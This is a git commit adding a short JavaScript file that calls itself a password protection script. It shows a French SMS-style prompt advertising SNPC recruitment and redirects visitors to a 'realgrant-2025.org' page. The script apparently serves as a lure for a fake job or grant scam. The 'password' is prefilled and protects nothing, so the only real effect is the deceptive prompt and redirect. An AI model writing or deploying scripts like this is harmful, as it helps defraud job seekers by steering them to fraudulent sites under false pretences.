f42c445483393e19bcb17beed6a1c671dd39cd57
Sweetblogboi <nsiboy760@gmail.com>
2025-02-15 08:19:09 +0100

    Create spnc-active.js

---
+++ spnc-active.js
@@ -0,0 +1,10 @@
+ 
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'SNPC Recrutement'
+password=prompt('SMS: La candidature est actuellement en cours, appuyez sur OK pour postuler au','SNPC Recrutement');
+if (password != 'SNPC Recrutement');
+if (password != 'SNPC Recrutement') {
+location.href='https://realgrant-2025.org/snpc.html';
+}
+
+      
